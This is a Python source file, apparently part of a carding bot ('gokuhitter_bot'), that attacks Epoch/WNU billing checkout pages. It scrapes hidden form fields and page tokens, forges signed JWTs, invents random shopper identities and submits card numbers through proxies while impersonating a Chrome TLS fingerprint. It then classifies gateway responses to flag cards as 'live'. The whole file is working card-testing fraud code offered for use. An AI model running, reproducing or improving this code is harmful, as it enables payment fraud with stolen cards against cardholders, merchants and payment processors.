"""
Epoch Payment Engine (gokuhitter_bot)
─────────────────────────────────────
Full Epoch billing page scraper, hidden form parameter extraction,
payment submission, and authorization parsing with TLS browser impersonation.
"""

import re
import json
import time
import random
import hmac
import hashlib
import base64
import urllib.parse
from typing import Dict, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs
from curl_compat import ChromeSession

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def _jwt_sign(payload: dict, secret: str) -> str:
    """Generates standard HS256 JWT string for Epoch/WNU signed API authentication."""
    header = {"alg": "HS256", "typ": "JWT"}
    
    def b64url(data_bytes: bytes) -> str:
        return base64.urlsafe_b64encode(data_bytes).decode('utf-8').rstrip('=')
    
    h_b64 = b64url(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    p_b64 = b64url(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    
    signing_input = f"{h_b64}.{p_b64}".encode('utf-8')
    sig = hmac.new(secret.encode('utf-8'), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url(sig)
    
    return f"{h_b64}.{p_b64}.{sig_b64}"

def _generate_random_shopper(country_code: str = 'US') -> dict:
    FIRST_NAMES = ['James', 'Michael', 'Robert', 'John', 'David', 'William', 'Richard', 'Joseph', 'Thomas', 'Charles', 'Christopher', 'Daniel', 'Matthew', 'Anthony', 'Mark', 'Steven', 'Paul', 'Andrew', 'Joshua', 'Sarah', 'Emily', 'Emma', 'Olivia', 'Sophia', 'Isabella', 'Ava', 'Mia', 'Charlotte', 'Amelia']
    LAST_NAMES = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez', 'Lopez', 'Gonzalez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore', 'Jackson', 'Martin']
    DOMAINS = ['gmail.com', 'outlook.com', 'yahoo.com', 'icloud.com', 'hotmail.com', 'proton.me']
    
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    num = random.randint(100, 9999)
    email = f"{first.lower()}.{last.lower()}{num}@{random.choice(DOMAINS)}"
    phone = f"{random.randint(201, 989)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
    
    STREETS = ['Oak Street', 'Maple Ave', 'Washington Blvd', 'Lincoln Way', 'Cedar Lane', 'Pine Street', 'Park Ave', 'Broadway', 'Elm St', 'Main St']
    CITIES_ZIP = [
        ('New York', 'NY', '10001'), ('Los Angeles', 'CA', '90001'), ('Chicago', 'IL', '60601'),
        ('Houston', 'TX', '77001'), ('Miami', 'FL', '33101'), ('Dallas', 'TX', '75201'),
        ('Seattle', 'WA', '98101'), ('Boston', 'MA', '02108'), ('Atlanta', 'GA', '30301'),
    ]
    city, state, zip_code = random.choice(CITIES_ZIP)
    house_num = str(random.randint(10, 9999))
    street = f"{house_num} {random.choice(STREETS)}"
    
    return {
        'first_name': first,
        'last_name': last,
        'full_name': f"{first} {last}",
        'email': email,
        'phone': phone,
        'street': street,
        'house_number': house_num,
        'city': city,
        'state': state,
        'postal_code': zip_code,
        'country': country_code or 'US'
    }

class EpochHitter:
    """Epoch Billing & WNU Payment Gateway Engine."""

    DECLINE_MAP = {
        "declined": "card_declined",
        "insufficient_funds": "insufficient_funds",
        "insufficient funds": "insufficient_funds",
        "do not honor": "do_not_honor",
        "do_not_honor": "do_not_honor",
        "incorrect cvc": "incorrect_cvc",
        "invalid cvc": "incorrect_cvc",
        "expired card": "expired_card",
        "invalid card": "invalid_number",
        "cvv declined": "incorrect_cvc",
        "cvc declined": "incorrect_cvc",
        "suspected fraud": "fraud",
        "restricted card": "restricted_card",
        "issuer unavailable": "issuer_unavailable",
    }

    def __init__(self, url: str, proxy_data: Optional[dict] = None):
        self.url = url.strip()
        if not self.url.startswith(("http://", "https://")):
            self.url = f"https://{self.url}"
        self.proxy_data = proxy_data
        self._base_cfg: Optional[dict] = None

    def _get_origin(self) -> str:
        parsed = urlparse(self.url)
        if parsed.netloc:
            return f"{parsed.scheme or 'https'}://{parsed.netloc}"
        return "https://billing.epoch.com"

    async def _scrape(self, session) -> dict:
        """Scrapes Epoch / WNU checkout page for form target action & parameters."""
        hdr = {
            "User-Agent": UA,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
        }
        cfg = {
            'action': self.url,
            'merchant': 'Epoch Merchant',
            'amount': None,
            'currency': 'USD',
            'form_data': {},
            'is_epoch': False,
            'token': None,
            'cacheKey': None,
            'sessionID': None,
        }

        if any(domain in self.url.lower() for domain in ['epoch.com', 'epochbilling', 'billing.epoch', 'wnu.com']):
            cfg['is_epoch'] = True

        parsed_q = parse_qs(urlparse(self.url).query)
        if 'cacheKey' in parsed_q:
            cfg['cacheKey'] = parsed_q['cacheKey'][0]
        if 'sessionID' in parsed_q:
            cfg['sessionID'] = parsed_q['sessionID'][0]

        async with session.get(self.url, headers=hdr, timeout=12) as res:
            html = res.text() if callable(res.text) else res.text
            
            # Check title
            t = re.search(r'<title>([^<]+)</title>', html, re.I)
            if t:
                title = t.group(1).strip()
                if ('epoch' in title.lower() or 'billing' in title.lower() or 'wnu' in title.lower()) and len(title) > 2:
                    cfg['is_epoch'] = True
                    cfg['merchant'] = title[:30]

            # 1. Parse WNU / Epoch SPA State (window.__INITIAL_STATE__)
            m_state = re.search(r'window\.__INITIAL_STATE__\s*=\s*(\{.*?\});', html, re.DOTALL)
            if m_state:
                try:
                    clean_state = m_state.group(1).replace('undefined', 'null')
                    state_data = json.loads(clean_state)
                    cfg['token'] = state_data.get('token')
                    cfg['cacheKey'] = state_data.get('queryParams', {}).get('cacheKey') or state_data.get('invoiceQuery', {}).get('cacheKey') or cfg['cacheKey']
                    cfg['sessionID'] = state_data.get('sessionID') or state_data.get('queryParams', {}).get('sessionID') or cfg['sessionID']
                    cfg['countryCode'] = state_data.get('locale', {}).get('countryCode') or 'US'
                    cfg['is_epoch'] = True
                except Exception:
                    pass

            # 2. Extract HTML form action
            m_form = re.search(r'<form[^>]+action=["\']([^"\']+)["\'][^>]*>', html, re.I)
            if m_form:
                action_target = m_form.group(1)
                cfg['action'] = urljoin(self.url, action_target)
                cfg['is_epoch'] = True

            # 3. Extract hidden input fields
            inputs = re.findall(r'<input[^>]+type=["\']?hidden["\']?[^>]*>', html, re.I)
            for inp in inputs:
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp, re.I)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp, re.I)
                if name_m and val_m:
                    cfg['form_data'][name_m.group(1)] = val_m.group(1)

            # Detect Epoch / WNU parameters in page or URL
            for param in ['pi_code', 'reseller', 'co_code', 'member_idx', 'pi_idx', 'order_id', 'cachekey', 'sessionid', 'wnu.com', 'invoice']:
                if param in html.lower() or param in self.url.lower():
                    cfg['is_epoch'] = True

            # Extract amount / price if visible
            amt_m = re.search(r'(?:USD|EUR|GBP|\$|£|€)\s*([\d\.]+)', html)
            if amt_m:
                cfg['amount'] = amt_m.group(1)

        # 4. If WNU / Epoch SPA token found, fetch live invoice metadata
        if cfg.get('token') and cfg.get('cacheKey'):
            try:
                inv_payload = {
                    "cacheKey": cfg['cacheKey'],
                    "countryCode": "US",
                    "isApplePayEnabled": False,
                    "language": "en",
                    "sessionId": cfg.get('sessionID', '')
                }
                jwt_tok = _jwt_sign(inv_payload, cfg['token'])
                inv_hdr = {
                    "Authorization": f"Bearer {jwt_tok}",
                    "Content-Type": "application/json",
                    "Accept": "application/json, text/plain, */*",
                    "User-Agent": UA,
                    "Origin": self._get_origin(),
                    "Referer": self.url,
                }
                inv_url = urljoin(self.url, "/invoice")
                async with session.post(inv_url, json=inv_payload, headers=inv_hdr, timeout=8) as r_inv:
                    if r_inv.status_code == 200:
                        inv_json = r_inv.json()
                        cfg['invoiceID'] = inv_json.get('invoiceID')
                        purchases = inv_json.get('invoiceInfo', {}).get('purchases', [])
                        if purchases:
                            p0 = purchases[0]
                            cfg['purchaseID'] = str(p0.get('purchase_id') or inv_json.get('invoiceInfo', {}).get('client_id') or "1")
                            cfg['purchaseItemID'] = str(p0.get('purchase_item_id') or "1")
                            cfg['siteID'] = str(p0.get('site_id') or "1")
                            cfg['productCode'] = str(p0.get('product_id') or "1")
                            site_name = p0.get('site') or inv_json.get('merchantInfo', {}).get('name')
                            if site_name:
                                cfg['merchant'] = site_name.replace('www.', '').capitalize()
                            billing = p0.get('billing', {})
                            curr = billing.get('currency', 'USD')
                            initial = billing.get('initial', {})
                            dollar_amt = initial.get('dollarAmount')
                            local_amt = initial.get('amount')
                            
                            if dollar_amt:
                                cfg['currency'] = 'USD'
                                cfg['amount'] = dollar_amt
                            elif local_amt:
                                cfg['currency'] = curr
                                cfg['amount'] = local_amt
            except Exception:
                pass

        return cfg

    async def _get_config(self, session) -> dict:
        if self._base_cfg is None:
            self._base_cfg = await self._scrape(session)
            return self._base_cfg.copy()
        return self._base_cfg.copy()

    # ── response parser ───────────────────────────────────────────────────────
    def _parse_response(self, html: str, status_code: int, result: dict) -> dict:
        """Parses HTML/JSON response from Epoch / WNU gateway."""
        result['raw_response'] = html

        # Parse JSON structured responses
        if status_code in (400, 401, 403, 404, 410, 500) or html.strip().startswith('{'):
            try:
                j = json.loads(html)
                if isinstance(j, dict):
                    err_msg = j.get('message') or j.get('error') or j.get('decline_code') or str(j)
                    if j.get('statusCode') in (401, 410) or 'authorization' in str(err_msg).lower() or 'expired' in str(err_msg).lower():
                        result['decline_code'] = 'link_expired'
                        result['error'] = '[!] Link Expired'
                        return result
                    result['decline_code'] = str(j.get('statusCode', 'error'))
                    result['error'] = str(err_msg)[:120]
                    return result
            except Exception:
                pass

        html_low = html.lower()

        # Approval indicators
        if any(term in html_low for term in ['approved', 'thank you for your order', 'transaction successful', 'order confirmation', 'welcome to', 'payment successful', 'order id:']):
            result['success'] = True
            m_url = re.search(r'href=["\'](https?://[^"\']+)["\']', html)
            if m_url:
                result['receipt_url'] = m_url.group(1)
            return result

        # 3DS / Redirect indicators
        if any(term in html_low for term in ['3d secure', '3ds', 'payer authentication', 'cardholder authentication', 'redirecting']):
            result['decline_code'] = '3ds_required'
            result['error'] = '3DS Authentication Required'
            result['is_live'] = True
            m_url = re.search(r'(https?://[^\s"\'<>]+(?:3d|acs|auth)[^\s"\'<>]*)', html, re.I)
            if m_url:
                result['redirect_url'] = m_url.group(1)
            return result

        # Explicit decline text extraction
        decline_m = re.search(r'(?:decline|refused|error|reason|message)\s*[:=]\s*["\']?([^"\'<.\n]{5,100})', html, re.I)
        if decline_m:
            reason = decline_m.group(1).strip()
            reason_low = reason.lower()
            mapped = 'card_declined'
            for k, v in self.DECLINE_MAP.items():
                if k in reason_low:
                    mapped = v
                    break
            result['decline_code'] = mapped
            result['error'] = reason
            result['is_live'] = mapped in ['insufficient_funds', 'incorrect_cvc', '3ds_required', 'restricted_card', 'issuer_unavailable']
            return result

        if 'insufficient funds' in html_low:
            result['decline_code'] = 'insufficient_funds'
            result['error'] = 'Insufficient Funds'
            result['is_live'] = True
            return result

        if 'cvv' in html_low or 'cvc' in html_low:
            result['decline_code'] = 'incorrect_cvc'
            result['error'] = 'CVV / CVC Declined'
            result['is_live'] = True
            return result

        if status_code >= 400:
            result['decline_code'] = f'http_{status_code}'
            result['error'] = f'Epoch Gateway HTTP {status_code}'
            return result

        result['decline_code'] = 'card_declined'
        result['error'] = 'Your payment was declined; please try again.'
        return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        """Executes payment attempt against Epoch gateway."""
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Epoch Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
        )

        proxies = None
        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}

        try:
            async with ChromeSession(impersonate="chrome131", proxies=proxies, timeout=12) as sess:
                cfg = await self._get_config(sess)
                result['merchant'] = cfg.get('merchant', 'Epoch Merchant')
                if cfg.get('amount'):
                    curr = cfg.get('currency', 'USD')
                    result['amount'] = f"{curr} {cfg['amount']}"

                if cfg.get('expired'):
                    result['error'] = "[!] Link Expired"
                    result['decline_code'] = 'link_expired'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                if not cfg.get('is_epoch') and 'epoch' not in self.url.lower():
                    result['error'] = "No Epoch checkout gateway detected on this page"
                    result['decline_code'] = 'no_epoch'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                if 'wnu.com' in self.url.lower() and not cfg.get('token'):
                    result['error'] = "[!] Link Expired"
                    result['decline_code'] = 'link_expired'
                    result['response_time'] = round(time.time() - t0, 2)
                    return result

                shopper = _generate_random_shopper(cfg.get('countryCode', 'US'))
                yr = card['year'] if len(card['year']) == 4 else f"20{card['year']}"
                yr_short = yr[-2:]

                # 1. Modern WNU / Epoch v4 JWT API flow
                if cfg.get('token') and (cfg.get('cacheKey') or 'wnu.com' in self.url.lower()):
                    c_key = cfg.get('cacheKey') or parse_qs(urlparse(self.url).query).get('cacheKey', [''])[0]
                    s_id = cfg.get('sessionID') or parse_qs(urlparse(self.url).query).get('sessionID', [''])[0]
                    visitor_id = hashlib.md5(f"{card['card']}_{time.time()}".encode()).hexdigest()
                    
                    tx_payload = {
                        "cacheKey": c_key,
                        "sessionID": s_id,
                        "invoiceID": cfg.get('invoiceID', c_key),
                        "purchaseID": cfg.get('purchaseID', '1'),
                        "purchaseItemID": cfg.get('purchaseItemID', '1'),
                        "siteID": cfg.get('siteID', '1'),
                        "productCode": cfg.get('productCode', '1'),
                        "currencyCode": cfg.get('currency', 'USD'),
                        "countryCode": shopper.get('country', 'US'),
                        "fingerprintVisitorId": visitor_id,
                        "submitCount": max(1, attempt),
                        "paymentType": "CreditDebitCard",
                        "redirectType": "CreditDebitCard",
                        "fullName": shopper['full_name'],
                        "name_on_card": shopper['full_name'],
                        "first_name": shopper['first_name'],
                        "last_name": shopper['last_name'],
                        "email": shopper['email'],
                        "postalCode": shopper['postal_code'],
                        "zip": shopper['postal_code'],
                        "city": shopper['city'],
                        "state": shopper['state'],
                        "street": shopper['street'],
                        "cardNumber": card['card'],
                        "card_number": card['card'],
                        "card_number_1": card['card'],
                        "cardNum": card['card'],
                        "cardExpiration": f"{card['month'].zfill(2)}/{yr_short}",
                        "expire_month": card['month'].zfill(2),
                        "expire_year": yr_short,
                        "cvv2": card['cvv'],
                        "cvv": card['cvv'],
                        "card": {
                            "cardNumber": card['card'],
                            "cardExpiration": f"{card['month'].zfill(2)}/{yr_short}",
                            "cvv2": card['cvv']
                        }
                    }
                    jwt_token = _jwt_sign(tx_payload, cfg['token'])
                    jwt_hdr = {
                        "Authorization": f"Bearer {jwt_token}",
                        "Content-Type": "application/json",
                        "Accept": "application/json, text/plain, */*",
                        "User-Agent": UA,
                        "Origin": self._get_origin(),
                        "Referer": self.url,
                        "Cookie": f"ephfpd={visitor_id}",
                    }
                    
                    tx_url = urljoin(self.url, "/transaction")
                    try:
                        async with sess.post(tx_url, json=tx_payload, headers=jwt_hdr, timeout=15) as r_tx:
                            tx_resp = r_tx.text() if callable(r_tx.text) else r_tx.text
                            result['response_time'] = round(time.time() - t0, 2)
                            return self._parse_response(tx_resp, r_tx.status_code, result)
                    except Exception:
                        pass

                # 2. Classic Epoch Form POST flow
                payload = {
                    **cfg['form_data'],
                    'card_number': card['card'],
                    'card_num': card['card'],
                    'card_number_1': card['card'],
                    'expire_month': card['month'].zfill(2),
                    'expire_year': yr_short,
                    'expire_year_full': yr,
                    'cvv2': card['cvv'],
                    'cvv': card['cvv'],
                    'security_code': card['cvv'],
                    'name_on_card': shopper['full_name'],
                    'first_name': shopper['first_name'],
                    'last_name': shopper['last_name'],
                    'email': shopper['email'],
                    'street': shopper['street'],
                    'city': shopper['city'],
                    'state': shopper['state'],
                    'zip': shopper['postal_code'],
                    'country': shopper['country'],
                }

                target_action = cfg['action'] or self.url
                hdr = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,application/json,*/*;q=0.8",
                    "User-Agent": UA,
                    "Origin": self._get_origin(),
                    "Referer": self.url,
                }

                async with sess.post(target_action, data=urllib.parse.urlencode(payload), headers=hdr, timeout=15) as r:
                    html_resp = r.text() if callable(r.text) else r.text
                    result['response_time'] = round(time.time() - t0, 2)
                    return self._parse_response(html_resp, r.status_code, result)

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result
